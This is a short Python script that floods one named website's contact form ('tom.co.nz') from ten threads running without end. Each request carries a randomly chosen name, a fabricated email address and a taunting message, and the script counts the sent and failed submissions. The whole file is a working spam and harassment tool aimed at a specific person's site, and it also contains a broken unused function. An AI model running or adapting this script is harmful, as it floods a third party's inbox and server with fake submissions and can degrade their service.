import requests
import random
import json
import threading

url = 'https://tom.co.nz/form/contact.php'

names = json.loads(open('names.json').read())

sent = 0
failed = 0

def lol():
	for j in range(1000000):
		s+='InputMessage'

	return s

def worker():
	global sent
	global failed
	while 1:
		name = names[random.randrange(0,len(names) - 1)]

		email = name.lower() + str(random.randrange(10,1000)) + '@npctom.com'

		req = requests.post(url, allow_redirects=False, data={


			'InputName': name,
			'InputEmail': email,
			'InputSubject': 'Hi Tom. I want a website',
			'InputMessage': 'sorry tom but i had to. From ' + email
		})
		if req.status_code == 200:
			sent += 1
		else:
			failed += 1
		# print('name: %s \t and email %s \t req= %s' % (name, email, req.status_code))
		print('req= %s\tsent= %i\tfailed= %i\tid= %s' % (req.status_code, sent, failed, str(threading.current_thread().name)))
		# print(req.text)


for i in range(10):
    t = threading.Thread(target=worker)
    t.start()

